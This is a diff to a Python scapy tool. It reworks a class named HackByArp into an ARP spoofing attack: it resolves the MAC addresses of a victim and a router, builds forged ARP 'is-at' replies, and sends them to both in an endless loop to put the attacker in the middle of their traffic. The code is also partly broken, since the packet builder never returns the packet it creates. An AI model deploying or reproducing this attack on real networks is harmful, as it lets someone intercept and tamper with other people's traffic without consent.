@@ -1,7 +1,8 @@
 import os
 from json import load, dump
 from abc import ABC, abstractmethod
-from scapy.all import ARP, send
+from scapy.all import ARP, send, get_if_addr, get_if_hwaddr, getmacbyip
+import getmac
 from time import sleep
 
 
@@ -15,36 +16,50 @@ class AbstractController(ABC):
 
 
 class HackByArp(AbstractController):
-    attacked_ip: str
-    attacked_mac: str
-    swapped_ip: str
-
     def __init__(self, parameters: dict = None) -> None:
         if parameters is not None:
             try:
-                self.attacked_ip = parameters['attacked_ip']
-                self.attacked_mac = parameters['attacked_mac']
-                self.swapped_ip = parameters['swapped_ip']
+                self.victim = parameters['victim']
+                self.router = parameters['router']
+                self.attacker = parameters['attacker']
             except KeyError as error:
                 print(f'It isn\'t corect configuration - {error}')
+        self._get_mac_addresses()
 
-    def _init_arp_response(self):
+    def _get_mac_addresses(self):
+        self.victim.append(getmac.get_mac_address(ip=self.victim[0]))
+        self.router.append(getmac.get_mac_address(ip=self.router[0]))
+        self.attacker.append(getmac.get_mac_address())
+
+    @staticmethod
+    def create_packet(victim_parameters: list, source_mac: str = None):
         try:
-            self.arp_response = ARP(
-                pdst=self.attacked_ip,
-                hwdst=self.attacked_mac,
-                psrc=self.swapped_ip,
+            arp_packet = ARP(
+                pdst=victim_parameters[0],
+                hwdst=victim_parameters[2],
+                psrc=victim_parameters[1],
                 op='is-at'
             )
-        except AttributeError as error:
-            print(f'I can\'t hacked this objects: ({error})')
+            if source_mac is not None:
+                arp_packet.hsrc = source_mac
+        except:
+            print('Packet is not created!')
 
-    def run(self, iterarions: int = 200):
-        for i in range(iterarions):
-            self._init_arp_response()
-            send(self.arp_response)
-            print(f'Attack no. {i+1} done!')
-            sleep(1)
+    def attack(self):
+        victim_arp = self.create_packet(self.victim)
+        router_arp = self.create_packet(self.router)
+        while True:
+            try:
+                send(victim_arp)
+                send(router_arp)
+                sleep(2)
+            except KeyboardInterrupt:
+                victim_arp = self.create_packet(self.victim, self.router[2])
+                router_arp = self.create_packet(self.router, self.victim[2])
+                send(victim_arp)
+                send(router_arp)
+                
+
 
 
 class ConfigurationReader(AbstractController):
@@ -56,6 +71,7 @@ class ConfigurationReader(AbstractController):
         return self.output
 
 
+# TODO: To rebuild!!
 class ConfigurationInput(AbstractController):
     def run(self):
         clear_console()
